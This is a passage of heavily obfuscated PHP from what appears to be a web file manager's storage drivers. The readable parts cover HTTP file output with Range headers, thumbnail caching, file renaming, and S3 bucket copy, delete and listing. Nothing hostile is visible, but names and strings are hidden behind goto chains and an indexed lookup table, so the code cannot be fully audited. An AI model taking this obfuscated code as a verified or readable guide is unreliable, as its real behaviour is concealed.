$f‚ñÆ¬‡¤Ì = intval(1000 * 1000 * ($C‡àŸ¼‡ò / $C¹¸îÑïó)); } goto fÆÀ‡íë…º; B¼×½ÂÁèÄ: $d¼Í¬èˆ = gmdate($d²ËÚïÑ’×[105], $dù †½º™£[$d²ËÚïÑ’×[106]]); $BÂ§Ÿ²êä‰ = $AÊÓßï¥ñÎ ? $AÊÓßï¥ñÎ : $this->iconvApp($dù †½º™£[$d²ËÚïÑ’×[28]]); $c…¬ëÛî…ä = 0; goto Eï‘ÂñÏ; F¼Ø†ğˆº÷: $d Ú¡’´æ¶ = $GLOBALS[$d²ËÚïÑ’×[6]][$d²ËÚïÑ’×[84]][$d²ËÚïÑ’×[90]][$d²ËÚïÑ’×[103]]; $C¹¸îÑïó = (double) $GLOBALS[$d²ËÚïÑ’×[6]][$d²ËÚïÑ’×[84]][$d²ËÚïÑ’×[90]][$d²ËÚïÑ’×[104]] * 1024 * 1024; @ob_end_clean(); goto Dßˆ»‰”æ; fŞâÂ³ˆó: if (!$FŒ³Œõ—å) { $FŒ³Œõ—å = md5($d¼Í¬èˆ . $this->hashSimple($C¢™è¾“Ãğ)); } $FŒ³Œõ—å = $d²ËÚïÑ’×[112] . $FŒ³Œõ—å . $d²ËÚïÑ’×[112]; $Aœ‚—ƒ  = get_file_mime($Cà±ğÛ·ë—); goto F­Ó–ËğÀ–; Càµ¼Ö«: header($d²ËÚïÑ’×[121] . $Aœ‚—ƒ ); header($d²ËÚïÑ’×[122] . gmdate($d²ËÚïÑ’×[105], time() + 3600 * 24 * 30) . $d²ËÚïÑ’×[123]); header($d²ËÚïÑ’×[124]); goto b¨¤’ªÏÏÎ; cë©òĞ•ï: header($d²ËÚïÑ’×[135]); $CÊ×„¡š¤İ = strtolower($_SERVER[$d²ËÚïÑ’×[136]]); if ($A½¹ÉÊ‚øÁ && $CÊ×„¡š¤İ && $d Ú¡’´æ¶) { if (strstr($CÊ×„¡š¤İ, $d²ËÚïÑ’×[137])) { header($d²ËÚïÑ’×[138] . $C¢™è¾“Ãğ); } else { if (strstr($CÊ×„¡š¤İ, $d²ËÚïÑ’×[139])) { header($d²ËÚïÑ’×[140] . $C¢™è¾“Ãğ); } else { if (strstr($CÊ×„¡š¤İ, $d²ËÚïÑ’×[141])) { header($d²ËÚïÑ’×[142] . $C¢™è¾“Ãğ); } } } if ($C¹¸îÑïó) { header($d²ËÚïÑ’×[143] . $C¹¸îÑïó); } return; } goto dê™‰„Ü­£; eñ²ÈÃ¶²: $e‰„²Ş†Ùƒ = $d²ËÚïÑ’×[112] . $e‰„²Ş†Ùƒ . $d²ËÚïÑ’×[116] . $e‰„²Ş†Ùƒ; if ($BÃôÔ’Ì¹Â) { header($d²ËÚïÑ’×[117]); header($d²ËÚïÑ’×[118] . $e‰„²Ş†Ùƒ); } else { header($d²ËÚïÑ’×[119] . $e‰„²Ş†Ùƒ); } header($d²ËÚïÑ’×[120]); goto Càµ¼Ö«; dê™‰„Ü­£: if (isset($_SERVER[$d²ËÚïÑ’×[144]])) { if (preg_match($d²ËÚïÑ’×[145], $_SERVER[$d²ËÚïÑ’×[144]], $aÀ­ßì±—)) { $c…¬ëÛî…ä = intval($aÀ­ßì±—[1]); if (!empty($aÀ­ßì±—[2])) { $Dã²Ç…õŞ× = intval($aÀ­ßì±—[2]); } } header($d²ËÚïÑ’×[146]); header("\103\157\x6e\x74\x65\x6e\164\55\122\x61\x6e\147\145\x3a\x20\x62\171\164\145\x73\40{$c…¬ëÛî…ä}\55{$Dã²Ç…õŞ×}\x2f" . $Eï‰ÌÏã¯); } else { header($d²ËÚïÑ’×[147]); } header($d²ËÚïÑ’×[148] . ($Dã²Ç…õŞ× - $c…¬ëÛî…ä + 1)); if ($_SERVER[$d²ËÚïÑ’×[149]] == $d²ËÚïÑ’×[150]) { return; } goto E›“Ñİ; b¨¤’ªÏÏÎ: header($d²ËÚïÑ’×[125]); header($d²ËÚïÑ’×[126]); if (isset($_SERVER[$d²ËÚïÑ’×[127]]) && strtotime($_SERVER[$d²ËÚïÑ’×[127]]) == $dù †½º™£[$d²ËÚïÑ’×[106]]) { header($d²ËÚïÑ’×[128], !0, 304); die; } goto a¬Ï«èÄö; Eï‘ÂñÏ: $Dã²Ç…õŞ× = $Eï‰ÌÏã¯ - 1; $Cà±ğÛ·ë— = $this->ext($BÂ§Ÿ²êä‰); if (in_array($Cà±ğÛ·ë—, array($d²ËÚïÑ’×[107], $d²ËÚïÑ’×[108], $d²ËÚïÑ’×[109], $d²ËÚïÑ’×[110]))) { $Cà±ğÛ·ë— = $d²ËÚïÑ’×[111]; } goto fŞâÂ³ˆó; BÛé„•ˆ‘ï: } public function fileOutServer($a›„‹ğÚã, $dŠ¥¦¡ÕÈ£ = false, $Böã·ã Š = false, $f²™ˆáˆ— = '') { $this->fileOut($a›„‹ğÚã, $dŠ¥¦¡ÕÈ£, $Böã·ã Š, $f²™ˆáˆ—); } public function fileOutLink($E¸…ÎÖ„°¾) { $aä©İ‡È¬ =& $_SERVER[÷ÖêïÔÔÓ]; if (substr($E¸…ÎÖ„°¾, 0, 7) == $aä©İ‡È¬[151]) { $E¸…ÎÖ„°¾ = $aä©İ‡È¬[152] . substr($E¸…ÎÖ„°¾, 7); } header($aä©İ‡È¬[153] . $E¸…ÎÖ„°¾); die; } public function cacheMehod($DÉ¼ó…×·¯, $aÙ²Ş¥‰–) { goto eó¥äÇİ‰º; Dá¢âÄÚ¸: $Cš¶èÁï¿Ğ[$B¢Á¥†°ÑÆ] = $D·“Æ‘ª‹¼; return $D·“Æ‘ª‹¼; goto Dö¬®ğñˆ‚; Eç·ôæ¬‚Ü: $D·“Æ‘ª‹¼ = isset($Cš¶èÁï¿Ğ[$B¢Á¥†°ÑÆ]) ? $Cš¶èÁï¿Ğ[$B¢Á¥†°ÑÆ] : null; if (!is_null($D·“Æ‘ª‹¼)) { return $D·“Æ‘ª‹¼; } $D·“Æ‘ª‹¼ = $this->{$DÉ¼ó…×·¯}($aÙ²Ş¥‰–); goto Dá¢âÄÚ¸; eó¥äÇİ‰º: $a¹¦¸êÃêø =& $_SERVER[÷ÖêïÔÔÓ]; static $Cš¶èÁï¿Ğ = array(); $B¢Á¥†°ÑÆ = $a¹¦¸êÃêø[154] . $DÉ¼ó…×·¯ . $a¹¦¸êÃêø[155] . rtrim($aÙ²Ş¥‰–, $a¹¦¸êÃêø[8]); goto Eç·ôæ¬‚Ü; Dö¬®ğñˆ‚: } public function fileOutImage($BèäğÌ¹ï, $Eà‡İ¹‰Úƒ = 250) { goto f¸°´÷¤µ‹; f¸°´÷¤µ‹: $bÇï—‘…ÌÁ =& $_SERVER[÷ÖêïÔÔÓ]; if (substr($BèäğÌ¹ï, 0, 4) == $bÇï—‘…ÌÁ[141]) { $this->fileOutLink($BèäğÌ¹ï); } $e”ºÂ“¹ÁÅ = $this->info($BèäğÌ¹ï); goto b‘¥‹â‚ô¼; b‘¥‹â‚ô¼: if ($e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[78]] <= 1024 * 50 || !function_exists($bÇï—‘…ÌÁ[156]) || $e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[157]] == $bÇï—‘…ÌÁ[158]) { return $this->fileOut($BèäğÌ¹ï); } if (isset($e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[159]][$bÇï—‘…ÌÁ[160]])) { $Eˆ‘…¶ğÁ¹ = $e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[159]][$bÇï—‘…ÌÁ[160]]; } else { if (isset($e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[159]][$bÇï—‘…ÌÁ[161]])) { $Eˆ‘…¶ğÁ¹ = $e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[159]][$bÇï—‘…ÌÁ[161]]; } else { $Eˆ‘…¶ğÁ¹ = md5("{$e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[28]]}\137{$e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[76]]}\x5f{$e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[78]]}"); } } $bÖÛäùíµ‰ = "{$Eˆ‘…¶ğÁ¹}\137{$Eà‡İ¹‰Úƒ}\x2e\160\x6e\147"; goto EõŠøãÈ‚; EõŠøãÈ‚: if (!($EØ¦ÕÁ›ÍÑ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $bÇï—‘…ÌÁ[162]))) { $Cœ‘Î„µ÷© = IO::mkdir(IO_PATH_SYSTEM_TEMP . $bÇï—‘…ÌÁ[163]); } else { $Cœ‘Î„µ÷© = KodIO::make($EØ¦ÕÁ›ÍÑ); } if ($EØ¦ÕÁ›ÍÑ = IO::fileNameExist($Cœ‘Î„µ÷©, $bÖÛäùíµ‰)) { $BöôØ²Ñó = KodIO::make($EØ¦ÕÁ›ÍÑ); return IO::fileOut($BöôØ²Ñó); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto FÆÉİ§±©è; FÆÉİ§±©è: $BöôØ²Ñó = DATA_THUMB . $bÖÛäùíµ‰; if (!@file_exists($BöôØ²Ñó)) { $cí‘ğ·¦§ã = TEMP_FILES; if (!is_dir($cí‘ğ·¦§ã)) { mk_dir($cí‘ğ·¦§ã); } $fƒÃç†Ñ»˜ = $cí‘ğ·¦§ã . $Eˆ‘…¶ğÁ¹ . $bÇï—‘…ÌÁ[92] . $e”ºÂ“¹ÁÅ[$bÇï—‘…ÌÁ[157]]; if (!@file_exists($fƒÃç†Ñ»˜)) { $fƒÃç†Ñ»˜ = $this->download($BèäğÌ¹ï, $fƒÃç†Ñ»˜); } $E£Š®Ñ¯æ = new ImageThumb($fƒÃç†Ñ»˜, $bÇï—‘…ÌÁ[164]); $E£Š®Ñ¯æ->prorate($BöôØ²Ñó, $Eà‡İ¹‰Úƒ, $Eà‡İ¹‰Úƒ); } if (!file_exists($BöôØ²Ñó) || filesize($BöôØ²Ñó) < 100) { return @file_exists($fƒÃç†Ñ»˜) ? IO::fileOut($fƒÃç†Ñ»˜) : $this->fileOut($BèäğÌ¹ï); } goto EêšÂÈÇ¼‚; EêšÂÈÇ¼‚: if (!($b‹Å ¯Ê‰ = IO::move($BöôØ²Ñó, $Cœ‘Î„µ÷©))) { return IO::fileOut($BöôØ²Ñó); } del_file($BöôØ²Ñó); IO::fileOut($b‹Å ¯Ê‰); goto E‰Äß®èÏÕ; E‰Äß®èÏÕ: } public function fileOutImageServer($aõŒó‡ß‘ñ, $a—Åî­·ĞÏ = 250) { $this->fileOutImage($aõŒó‡ß‘ñ, $a—Åî­·ĞÏ); } public function fileNameAuto($fë³Îßğò¦, $d•Û½õˆÉš, $fºè¾À‡…„ = REPEAT_RENAME, $A¥®ô—º½å = false) { goto BµŠğ´óñ»; D¥¥í½§Åß: while ($this->exist(rtrim($fë³Îßğò¦, $B½òÂŒ•ÛÉ[8]) . $B½òÂŒ•ÛÉ[8] . $eõÈòÃ‚À…)) { $eõÈòÃ‚À… = $bÀ’‡ŞƒÚ© . "\x28{$bÈ§¦Šì£}\51{$CÒÜ‹°œÔİ}"; $bÈ§¦Šì£++; } return $eõÈòÃ‚À…; goto eÛµ‚îÀÂã; bÛñÃ‹õ¸ƒ: if ($fºè¾À‡…„ == REPEAT_SKIP) { return !1; } $CÒÜ‹°œÔİ = $B½òÂŒ•ÛÉ[92] . get_path_ext($d•Û½õˆÉš); $CÒÜ‹°œÔİ = $CÒÜ‹°œÔİ == $B½òÂŒ•ÛÉ[92] || $A¥®ô—º½å ? $B½òÂŒ•ÛÉ[33] : $CÒÜ‹°œÔİ; goto eùç¹îµä; eùç¹îµä: $bÈ§¦Šì£ = 1; $bÀ’‡ŞƒÚ© = substr($d•Û½õˆÉš, 0, strlen($d•Û½õˆÉš) - strlen($CÒÜ‹°œÔİ)); $eõÈòÃ‚À… = $bÀ’‡ŞƒÚ© . "\50{$bÈ§¦Šì£}\51{$CÒÜ‹°œÔİ}"; goto D¥¥í½§Åß; BµŠğ´óñ»: $B½òÂŒ•ÛÉ =& $_SERVER[÷ÖêïÔÔÓ]; $b¸âœŒÊîÜ = $fë³Îßğò¦ === $B½òÂŒ•ÛÉ[33] ? $d•Û½õˆÉš : rtrim($fë³Îßğò¦, $B½òÂŒ•ÛÉ[8]) . $B½òÂŒ•ÛÉ[8] . $d•Û½õˆÉš; if ($fºè¾À‡…„ == REPEAT_REPLACE || !$this->exist($b¸âœŒÊîÜ) || $A¥®ô—º½å && $fºè¾À‡…„ != REPEAT_RENAME_FOLDER) { return $d•Û½õˆÉš; } goto bÛñÃ‹õ¸ƒ; eÛµ‚îÀÂã: } public function listAllFiles($A›ÊÎ‰Ğˆª, $Bİ®Ë‹óƒ‘, $E”†ø³ôõ„ = array()) { goto A‰Ä”ŠÊ‡‡; cáÌÓ¹‡: foreach (array_unique($eªİ‡š¤¢‰) as $c†˜Âê ³²) { $F‰¨‡Ü Ûœ = array($bİÍ‚Ñøˆƒ[76] => $this->getPathOuter($bİÍ‚Ñøˆƒ[8] . $A›ÊÎ‰Ğˆª . $bİÍ‚Ñøˆƒ[8] . $c†˜Âê ³²), $bİÍ‚Ñøˆƒ[77] => 1, $bİÍ‚Ñøˆƒ[78] => 0); if (substr($c†˜Âê ³², -1) != $bİÍ‚Ñøˆƒ[8]) { $F‰¨‡Ü Ûœ[$bİÍ‚Ñøˆƒ[77]] = 0; $eµ‘¸ÜÚ¿» = $this->getPath($A›ÊÎ‰Ğˆª . $bİÍ‚Ñøˆƒ[8] . $c†˜Âê ³²); $F‰¨‡Ü Ûœ[$bİÍ‚Ñøˆƒ[78]] = isset($E”†ø³ôõ„[$eµ‘¸ÜÚ¿»]) ? $E”†ø³ôõ„[$eµ‘¸ÜÚ¿»] : $this->size($eµ‘¸ÜÚ¿»); } $CñãïÛÛ©[] = $F‰¨‡Ü Ûœ; } return $CñãïÛÛ©; goto a¨¦­óÃÛ; A‰Ä”ŠÊ‡‡: $bİÍ‚Ñøˆƒ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($Bİ®Ë‹óƒ‘)) { return array(); } $eªİ‡š¤¢‰ = array(); goto A¢Û´Ñå˜; A¢Û´Ñå˜: $A›ÊÎ‰Ğˆª = trim($A›ÊÎ‰Ğˆª, $bİÍ‚Ñøˆƒ[8]); foreach ($Bİ®Ë‹óƒ‘ as $c†˜Âê ³²) { $F¨ŸÕ­é¤  = ltrim(substr($c†˜Âê ³², strlen($A›ÊÎ‰Ğˆª)), $bİÍ‚Ñøˆƒ[8]); $eªİ‡š¤¢‰ = array_merge($eªİ‡š¤¢‰, $this->slicePath($F¨ŸÕ­é¤ )); } $CñãïÛÛ© = array(); goto cáÌÓ¹‡; a¨¦­óÃÛ: } public function slicePath($Aãè¯œˆˆ) { $E´–¤Èï­· =& $_SERVER[÷ÖêïÔÔÓ]; $bòÀ±ˆìÑâ = explode($E´–¤Èï­·[8], trim($Aãè¯œˆˆ, $E´–¤Èï­·[8])); $eó½öŸ¸„º = 0; do { ++$eó½öŸ¸„º; $E‡Ş¾‡Ù‘[] = implode($E´–¤Èï­·[8], array_slice($bòÀ±ˆìÑâ, 0, $eó½öŸ¸„º)) . $E´–¤Èï­·[8]; } while ($eó½öŸ¸„º < count($bòÀ±ˆìÑâ)); $E‡Ş¾‡Ù‘[count($bòÀ±ˆìÑâ) - 1] = $Aãè¯œˆˆ; return $E‡Ş¾‡Ù‘; } public function getHost() { $EÀ›İ¹÷ÖÆ =& $_SERVER[÷ÖêïÔÔÓ]; $d²ğ¿ä¥‰Ä = parse_url(trim($this->domain, $EÀ›İ¹÷ÖÆ[8])); $C©óİÖáÀ³ = isset($d²ğ¿ä¥‰Ä[$EÀ›İ¹÷ÖÆ[165]]) ? $d²ğ¿ä¥‰Ä[$EÀ›İ¹÷ÖÆ[165]] : http_type(); $F‚áŠğó…œ = isset($d²ğ¿ä¥‰Ä[$EÀ›İ¹÷ÖÆ[166]]) ? $d²ğ¿ä¥‰Ä[$EÀ›İ¹÷ÖÆ[166]] : $d²ğ¿ä¥‰Ä[$EÀ›İ¹÷ÖÆ[76]]; if (isset($d²ğ¿ä¥‰Ä[$EÀ›İ¹÷ÖÆ[167]])) { $F‚áŠğó…œ .= $EÀ›İ¹÷ÖÆ[4] . $d²ğ¿ä¥‰Ä[$EÀ›İ¹÷ÖÆ[167]]; } return $C©óİÖáÀ³ . $EÀ›İ¹÷ÖÆ[168] . $F‚áŠğó…œ; } public function pathEncode($e°…æŒ¡Ç¾) { $A·ŠÚ¢Æ«÷ =& $_SERVER[÷ÖêïÔÔÓ]; return str_replace($A·ŠÚ¢Æ«÷[169], $A·ŠÚ¢Æ«÷[8], rawurlencode($e°…æŒ¡Ç¾)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public function __construct($c‘íøĞ¤¾ï) { set_timeout(); require_once SDK_DIR . $_SERVER[÷ÖêïÔÔÓ][170]; parent::__construct(); $this->_init($c‘íøĞ¤¾ï); } public function _init($C»œ®ãî‹) { foreach ($C»œ®ãî‹ as $bƒº¦áâ¤ƒ => $bš–“ÎÓÏó) { if (isset($this->{$bƒº¦áâ¤ƒ})) { $this->{$bƒº¦áâ¤ƒ} = $bš–“ÎÓÏó; } } $this->endpoint = $C»œ®ãî‹[$_SERVER[÷ÖêïÔÔÓ][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($cß‘â¿…Æ = "\166\64") { $this->signVer = $cß‘â¿…Æ; $this->client->setSignatureVersion($cß‘â¿…Æ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto dÊÚÌ¶; fİé…ÔÒ¥ï: $cÓğº—Ù† = array($còÜğŠÉÙ¼[177], $còÜğŠÉÙ¼[178], $còÜğŠÉÙ¼[179], $còÜğŠÉÙ¼[180], $còÜğŠÉÙ¼[181]); $CÇ‘î‹‘£ = array_diff($cÓğº—Ù†, $d ÅÚ•ô”); return empty($CÇ‘î‹‘£); goto dğÆÃÍ–¢; dÊÚÌ¶: $còÜğŠÉÙ¼ =& $_SERVER[÷ÖêïÔÔÓ]; $CĞ­“È² = $this->getBucketCors(); if (!$CĞ­“È² || !is_array($CĞ­“È²)) { return !1; } goto E¡³¡‚óßŠ; E¡³¡‚óßŠ: if ($CĞ­“È²[$còÜğŠÉÙ¼[172]] != $còÜğŠÉÙ¼[173] || $CĞ­“È²[$còÜğŠÉÙ¼[174]] != $còÜğŠÉÙ¼[173]) { return !1; } $d ÅÚ•ô” = array_map($còÜğŠÉÙ¼[175], $CĞ­“È²[$còÜğŠÉÙ¼[176]]); if (!is_array($d ÅÚ•ô”)) { $d ÅÚ•ô” = array(); } goto fİé…ÔÒ¥ï; dğÆÃÍ–¢: } public function mkfile($dùòöµ¸†Ç, $A¡®‘â•Ú = '', $F¡‹š‰Ìñ° = REPEAT_RENAME) { $E÷ÌîÌë÷™ = $this->setContent($dùòöµ¸†Ç, $A¡®‘â•Ú); if ($E÷ÌîÌë÷™ !== !1) { return $this->getPathOuter($dùòöµ¸†Ç); } return !1; } public function mkdir($e…ÛŞ˜Ş³Õ, $fÙŠÜÀµµ³ = REPEAT_SKIP) { if (empty($e…ÛŞ˜Ş³Õ)) { return !1; } if ($this->_isFolder($e…ÛŞ˜Ş³Õ)) { return $this->getPathOuter($e…ÛŞ˜Ş³Õ); } $F›œÔÛÈÕŞ = $this->setContent($e…ÛŞ˜Ş³Õ, $_SERVER[÷ÖêïÔÔÓ][33], !0); if ($F›œÔÛÈÕŞ !== !1) { return $this->getPathOuter($e…ÛŞ˜Ş³Õ); } return !1; } public function copyFile($b†Ü®ô™èä, $b–Î´Å‘¦Ä, $FÕñª¨Í‰ = array()) { $a£µË‘ÚŒê =& $_SERVER[÷ÖêïÔÔÓ]; $E¿äàæ»… = $this->objectMeta($b†Ü®ô™èä); if (!$E¿äàæ»…) { return !1; } if ($E¿äàæ»…[$a£µË‘ÚŒê[78]] <= 1024 * 1024 * 200) { $d‘®ãŞòÀÂ = $this->client->copyObject($this->bucket, $b†Ü®ô™èä, $this->bucket, $b–Î´Å‘¦Ä, $a£µË‘ÚŒê[182], $FÕñª¨Í‰); } else { $d‘®ãŞòÀÂ = $this->client->multiCopyObject($this->bucket, $b†Ü®ô™èä, $this->bucket, $b–Î´Å‘¦Ä, $FÕñª¨Í‰); } $d‘®ãŞòÀÂ = $d‘®ãŞòÀÂ ? $this->getPathOuter($b–Î´Å‘¦Ä) : !1; return $d‘®ãŞòÀÂ; } public function moveFile($AÈøóÇ‰ÈÈ, $EÔ°éò·‘) { if ($this->copyFile($AÈøóÇ‰ÈÈ, $EÔ°éò·‘)) { $this->delFile($AÈøóÇ‰ÈÈ); return $this->getPathOuter($EÔ°éò·‘); } return !1; } public function delFile($dÜÉ¯Ñó’) { return $this->client->deleteObject($this->bucket, $dÜÉ¯Ñó’); } public function delFolder($B‘·ğ‰øé) { goto AÖò¦öœßñ; AÖò¦öœßñ: $a÷ˆ†ˆÀÆÆ =& $_SERVER[÷ÖêïÔÔÓ]; $aÀ‰È´ª¾ã = $this->listObjs($B‘·ğ‰øé); if (!$aÀ‰È´ª¾ã) { $B‘·ğ‰øé = trim($B‘·ğ‰øé, $a÷ˆ†ˆÀÆÆ[8]); if (!empty($B‘·ğ‰øé)) { $B‘·ğ‰øé .= $a÷ˆ†ˆÀÆÆ[8]; } return $this->delFile($B‘·ğ‰øé); } goto A•šÒ´³¬; A•šÒ´³¬: $bíß®¤â—† = $CÒ¨²ï§Ÿª = 0; $cöÜ‡ÄÇ†æ = array_chunk(array_keys($aÀ‰È´ª¾ã), 1000); foreach ($cöÜ‡ÄÇ†æ as $dğŠ®¦œòƒ) { $bíß®¤â—†++; $CÒ¨²ï§Ÿª += (int) $this->client->deleteObjects($this->bucket, $dğŠ®¦œòƒ); } goto F‰øØã—š; F‰øØã—š: return $bíß®¤â—† === $CÒ¨²ï§Ÿª ? !0 : !1; goto f‹šìÊ¼§…; f‹šìÊ¼§…: } public function rename($D‚èÕòÌËƒ, $FÏ›ì™á³¡) { return $this->renameObject($D‚èÕòÌËƒ, $FÏ›ì™á³¡); } public function listPath($BÇÍˆ™­Öî, $d—‚„…µÁŒ = false) { $fÂÌºÑ‘ø =& $_SERVER[÷ÖêïÔÔÓ]; $CïÅ»Æ½È = $this->listObjs($BÇÍˆ™­Öî, null, null, $fÂÌºÑ‘ø[8]); $eÃàÀ•ö“Ñ = array($fÂÌºÑ‘ø[75] => array(), $fÂÌºÑ‘ø[74] => array()); foreach ($CïÅ»Æ½È as $F¨¸Ó¶æ™Ğ => $D‰æªÆâƒ¡) { if ($F¨¸Ó¶æ™Ğ == $fÂÌºÑ‘ø[8]) { continue; } if (isset($D‰æªÆâƒ¡[$fÂÌºÑ‘ø[183]])) { $eÃàÀ•ö“Ñ[$fÂÌºÑ‘ø[75]][] = $this->folderInfo($D‰æªÆâƒ¡[$fÂÌºÑ‘ø[183]], $d—‚„…µÁŒ); } else { if (substr($D‰æªÆâƒ¡[$fÂÌºÑ‘ø[28]], -1) == $fÂÌºÑ‘ø[8]) { continue; } $eÃàÀ•ö“Ñ[$fÂÌºÑ‘ø[74]][] = $this->fileInfo($D‰æªÆâƒ¡[$fÂÌºÑ‘ø[28]], $d—‚„…µÁŒ, $D‰æªÆâƒ¡); } } return $eÃàÀ•ö“Ñ; } private function fileInfo($bÂ² ‹‘ó£, $f‹‹¢ğÛ = false, $d‘Â†°ÛÒ¤ = array()) { goto FÕ“…Æ¾ƒã; Dä®ÅÂìª: if (empty($d‘Â†°ÛÒ¤)) { $d‘Â†°ÛÒ¤ = $this->objectMeta($bÂ² ‹‘ó£); if (!$d‘Â†°ÛÒ¤) { return $c‚·¶ÆÅÀë; } } if (isset($d‘Â†°ÛÒ¤[$AÚ¤¾ì‚¦¾[187]])) { $c‚·¶ÆÅÀë[$AÚ¤¾ì‚¦¾[106]] = $d‘Â†°ÛÒ¤[$AÚ¤¾ì‚¦¾[187]]; } if (isset($d‘Â†°ÛÒ¤[$AÚ¤¾ì‚¦¾[78]])) { $c‚·¶ÆÅÀë[$AÚ¤¾ì‚¦¾[78]] = $d‘Â†°ÛÒ¤[$AÚ¤¾ì‚¦¾[78]]; } goto cïññ¿±ø±; cïññ¿±ø±: return $c‚·¶ÆÅÀë; goto F”÷ïšë—†; FÕ“…Æ¾ƒã: $AÚ¤¾ì‚¦¾ =& $_SERVER[÷ÖêïÔÔÓ]; if ($f‹‹¢ğÛ) { return array($AÚ¤¾ì‚¦¾[28] => $this->pathThis($bÂ² ‹‘ó£), $AÚ¤¾ì‚¦¾[76] => $this->getPathOuter($bÂ² ‹‘ó£), $AÚ¤¾ì‚¦¾[29] => $AÚ¤¾ì‚¦¾[164], $AÚ¤¾ì‚¦¾[157] => $this->ext($bÂ² ‹‘ó£), $AÚ¤¾ì‚¦¾[78] => isset($d‘Â†°ÛÒ¤[$AÚ¤¾ì‚¦¾[78]]) ? $d‘Â†°ÛÒ¤[$AÚ¤¾ì‚¦¾[78]] : 0, $AÚ¤¾ì‚¦¾[184] => $AÚ¤¾ì‚¦¾[50], $AÚ¤¾ì‚¦¾[106] => $AÚ¤¾ì‚¦¾[50], $AÚ¤¾ì‚¦¾[185] => !0, $AÚ¤¾ì‚¦¾[186] => !0); } $c‚·¶ÆÅÀë = array($AÚ¤¾ì‚¦¾[28] => $this->pathThis($bÂ² ‹‘ó£), $AÚ¤¾ì‚¦¾[76] => $this->getPathOuter($bÂ² ‹‘ó£), $AÚ¤¾ì‚¦¾[29] => $AÚ¤¾ì‚¦¾[164], $AÚ¤¾ì‚¦¾[184] => $AÚ¤¾ì‚¦¾[50], $AÚ¤¾ì‚¦¾[106] => $AÚ¤¾ì‚¦¾[50], $AÚ¤¾ì‚¦¾[78] => 0, $AÚ¤¾ì‚¦¾[157] => $this->ext($bÂ² ‹‘ó£), $AÚ¤¾ì‚¦¾[185] => !0, $AÚ¤¾ì‚¦¾[186] => !0); goto Dä®ÅÂìª; F”÷ïšë—†: } private function folderInfo($e á÷¥ÕÁì, $EŠâåÜÌæá = false) { goto e‡¶á”¥™Á; E´ô©±¾™…: if ($e á÷¥ÕÁì == $bµ÷Œï¶Ş[33]) { return $aÒ‚´ø°«»; } $e á÷¥ÕÁì = trim($e á÷¥ÕÁì, $bµ÷Œï¶Ş[8]) . $bµ÷Œï¶Ş[8]; $a¤ÓÊî¡ùŒ = $this->objectMeta($e á÷¥ÕÁì); goto F¼óÔ•äé¼; e‡¶á”¥™Á: $bµ÷Œï¶Ş =& $_SERVER[÷ÖêïÔÔÓ]; if ($EŠâåÜÌæá) { return array($bµ÷Œï¶Ş[28] => $this->pathThis($e á÷¥ÕÁì), $bµ÷Œï¶Ş[76] => $this->getPathOuter($bµ÷Œï¶Ş[8] . $e á÷¥ÕÁì), $bµ÷Œï¶Ş[29] => $bµ÷Œï¶Ş[77], $bµ÷Œï¶Ş[185] => !0, $bµ÷Œï¶Ş[186] => !0); } $aÒ‚´ø°«» = array($bµ÷Œï¶Ş[28] => $this->pathThis($e á÷¥ÕÁì), $bµ÷Œï¶Ş[76] => $this->getPathOuter($bµ÷Œï¶Ş[8] . $e á÷¥ÕÁì), $bµ÷Œï¶Ş[29] => $bµ÷Œï¶Ş[77], $bµ÷Œï¶Ş[184] => $bµ÷Œï¶Ş[50], $bµ÷Œï¶Ş[106] => $bµ÷Œï¶Ş[50], $bµ÷Œï¶Ş[185] => !0, $bµ÷Œï¶Ş[186] => !0); goto E´ô©±¾™…; F¼óÔ•äé¼: if (!$a¤ÓÊî¡ùŒ) { return $aÒ‚´ø°«»; } if (isset($DÀ‘´øóöó[$bµ÷Œï¶Ş[187]])) { $aÒ‚´ø°«»[$bµ÷Œï¶Ş[184]] = $DÀ‘´øóöó[$bµ÷Œï¶Ş[187]]; } return $aÒ‚´ø°«»; goto aŞªê˜Âé­; aŞªê˜Âé­: } public function listObjs($c…‹÷š¿‚ß, $bá ’†Ü³Ò = null, $B·º‰¡ë‰’ = null, $a¡µ»›ÏİÑ = null) { $d™²õ¸ÇÀ =& $_SERVER[÷ÖêïÔÔÓ]; $c…‹÷š¿‚ß = trim($c…‹÷š¿‚ß, $d™²õ¸ÇÀ[8]); $aÓ˜ºÚÇÛ¸ = empty($c…‹÷š¿‚ß) ? $d™²õ¸ÇÀ[33] : $c…‹÷š¿‚ß . $d™²õ¸ÇÀ[8]; return $this->client->getBucket($this->bucket, $aÓ˜ºÚÇÛ¸, $bá ’†Ü³Ò, $B·º‰¡ë‰’, $a¡µ»›ÏİÑ, !0); } public function has($a–İ·¨ĞÈÉ, $a­ŒŒ†çº® = false, $a¨È±‰ßÊæ = true) { goto fƒÄßÓ—…·; fƒÄßÓ—…·: $E—Û‘øÆÅ =& $_SERVER[÷ÖêïÔÔÓ]; $aæª šÅ˜Õ = 0; $aí„Æäºâ² = 0; goto D Ò½ºİŒÔ; F„Ì¿¾ïçÉ: if ($a­ŒŒ†çº®) { return array($E—Û‘øÆÅ[188] => $aæª šÅ˜Õ, $E—Û‘øÆÅ[189] => $aí„Æäºâ²); } return !1; goto DªË£ÖŒ‰; D Ò½ºİŒÔ: $cŒØóèŞæ = $this->listObjs($a–İ·¨ĞÈÉ, null, null, $E—Û‘øÆÅ[8]); $cŒØóèŞæ = is_array($cŒØóèŞæ) ? 